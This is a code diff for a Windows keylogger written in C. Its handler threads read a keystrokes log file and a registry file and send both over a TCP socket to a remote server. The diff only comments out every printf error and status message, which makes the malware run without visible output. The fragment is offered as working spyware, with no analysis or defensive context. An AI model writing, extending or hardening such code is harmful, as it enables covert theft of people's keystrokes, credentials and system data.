@@ -145,7 +145,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) > 0) {
                 // TranslateMessage(&msg);
                 if(strcmp(command, "run") != 0) {
-                    printf("Cmd changed uninstallHook()\n");
+                    // printf("Cmd changed uninstallHook()\n");
                     break;
                 }
             }
@@ -156,7 +156,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             data_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (data_client_socket == INVALID_SOCKET)
             {
-                printf("socket creation failed: %d\n", WSAGetLastError());
+                // printf("socket creation failed: %d\n", WSAGetLastError());
                 fclose(logfile);
                 WSACleanup();
                 return 1;
@@ -166,7 +166,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             result = connect(data_client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
             if (result == SOCKET_ERROR)
             {
-                printf("connect failed: %d\n", WSAGetLastError());
+                // printf("connect failed: %d\n", WSAGetLastError());
                 fclose(logfile);
                 closesocket(data_client_socket);
                 WSACleanup();
@@ -179,7 +179,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             logfile = fopen("keystrokes.log", "rb");
             if (logfile == NULL)
             {
-                printf("Error opening log file: %d\n", GetLastError());
+                // printf("Error opening log file: %d\n", GetLastError());
                 continue;
             }
 
@@ -187,7 +187,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
             char payload = 0;
             if (send(data_client_socket, &payload, sizeof(char), 0) < 0)
             {
-                printf("Error sending data: %d\n", WSAGetLastError());
+                // printf("Error sending data: %d\n", WSAGetLastError());
                 fclose(logfile);
                 closesocket(data_client_socket);
                 WSACleanup();
@@ -233,7 +233,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                 data_client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                 if (data_client_socket == INVALID_SOCKET)
                 {
-                    printf("socket creation failed: %d\n", WSAGetLastError());
+                    // printf("socket creation failed: %d\n", WSAGetLastError());
                     fclose(logfile);
                     WSACleanup();
                     return 1;
@@ -272,7 +272,7 @@ DWORD WINAPI command_handler(LPVOID lpParam)
                         return 1;
                     }
                 }
-                printf("Done: %d", i);
+                // printf("Done: %d", i);
                 // Free the buffer, close the connection, and close the registry file
                 
                 fclose(regfile);
@@ -308,7 +308,7 @@ int main()
     int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (result != 0)
     {
-        printf("WSAStartup failed: %d\n", result);
+        // printf("WSAStartup failed: %d\n", result);
         return 1;
     }
     
@@ -317,7 +317,7 @@ int main()
     HANDLE connection_thread = CreateThread(NULL, 0, connection_handler, NULL, 0, NULL);
     if (connection_thread == NULL)
     {
-        printf("Error creating connection handler thread: %d\n", GetLastError());
+        // printf("Error creating connection handler thread: %d\n", GetLastError());
         WSACleanup();
         return 1;
     }
@@ -326,7 +326,7 @@ int main()
     HANDLE keylogger_thread = CreateThread(NULL, 0, command_handler, (LPVOID)logfile, 0, NULL);
     if (keylogger_thread == NULL)
     {
-        printf("Error creating keylogger handler thread: %d\n", GetLastError());
+        // printf("Error creating keylogger handler thread: %d\n", GetLastError());
         WSACleanup();
         return 1;
     }
